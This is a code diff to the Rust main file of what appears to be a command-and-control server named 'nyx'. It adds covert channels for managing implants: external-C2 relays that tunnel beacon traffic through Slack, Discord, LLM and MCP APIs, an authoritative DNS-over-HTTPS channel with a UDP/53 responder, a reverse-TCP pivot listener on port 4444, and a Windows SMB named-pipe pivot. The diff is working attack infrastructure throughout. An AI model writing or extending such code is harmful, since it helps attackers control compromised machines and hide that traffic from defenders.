@@ -271,11 +271,31 @@ async fn main() -> anyhow::Result<()> {
     if extc2.any_enabled() {
         tracing::info!(
             slack = extc2.slack.is_some(),
+            llm = extc2.llm.is_some(),
+            discord = extc2.discord.is_some(),
             mcp = extc2.mcp.is_some(),
-            "external-C2 relay enabled (routes /extc2/slack and /extc2/mcp now \
-             fan out to the real third-party API via nyx-transport)"
+            "external-C2 relays enabled (configured /extc2/* routes now fan out \
+             to the real third-party API via nyx-transport; unconfigured routes \
+             keep working as plain beacon endpoints)"
         );
     }
+
+    // Authoritative DNS/DoH channel (spec-2): NYX_DOH_DOMAIN enables the
+    // server half of the DohDnsTransport — chunk reassembly, the RFC 8484
+    // JSON `/dns-query` endpoint, and (when NYX_DOH_UDP_ADDR is set) the
+    // UDP/53 wire responder for real NS delegation. Absent → channel off.
+    let doh_state = match std::env::var("NYX_DOH_DOMAIN") {
+        Ok(domain) if !domain.trim().is_empty() => {
+            tracing::info!(
+                domain = %domain.trim(),
+                "DoH DNS channel enabled (authoritative responder for this zone)"
+            );
+            Some(nyx_server::dns_responder::DohState::new(
+                domain.trim().to_string(),
+            ))
+        }
+        _ => None,
+    };
 
     let mut state = AppState {
         keypair,
@@ -294,6 +314,7 @@ async fn main() -> anyhow::Result<()> {
         implants: implant_store,
         sessions_db,
         extc2,
+        doh: doh_state,
     };
     state.register_default_hooks();
     // Optional operator automation: a Rhai script run on session/result events.
@@ -325,6 +346,30 @@ async fn main() -> anyhow::Result<()> {
     let pubkey = hex::encode(state.keypair.public_bytes());
 
     let app = router(state.clone());
+    // Spawn the authoritative UDP DNS responder when the DNS channel is
+    // enabled. Bind address from NYX_DOH_UDP_ADDR (default 0.0.0.0:53); a
+    // bind failure is logged and the HTTP JSON path keeps working.
+    if state.doh.is_some() {
+        let udp_bind =
+            std::env::var("NYX_DOH_UDP_ADDR").unwrap_or_else(|_| "0.0.0.0:53".to_string());
+        nyx_server::dns_responder::spawn_udp_responder(state.clone(), udp_bind);
+    }
+    // TCP pivot listener (reverse_tcp parent, spec-3): NYX_TCP_PIVOT_ADDR,
+    // e.g. "0.0.0.0:4444". Absent → the channel's parent side is not hosted
+    // here (a parent implant can host it instead).
+    if let Ok(bind) = std::env::var("NYX_TCP_PIVOT_ADDR") {
+        if !bind.trim().is_empty() {
+            nyx_server::tcp_pivot::spawn(state.clone(), bind.trim().to_string());
+        }
+    }
+    // SMB named-pipe pivot listener (spec-2): NYX_SMB_PIPE_NAME on Windows
+    // only (named pipes don't exist on other platforms).
+    #[cfg(windows)]
+    if let Ok(pipe) = std::env::var("NYX_SMB_PIPE_NAME") {
+        if !pipe.trim().is_empty() {
+            nyx_server::smb_listener::spawn(state.clone(), pipe.trim().to_string());
+        }
+    }
     // Port-in-use guard: a quick std bind-then-drop detects stale instances
     // before the real tokio listener. Gives a clear error instead of the
     // opaque "os error 10048".
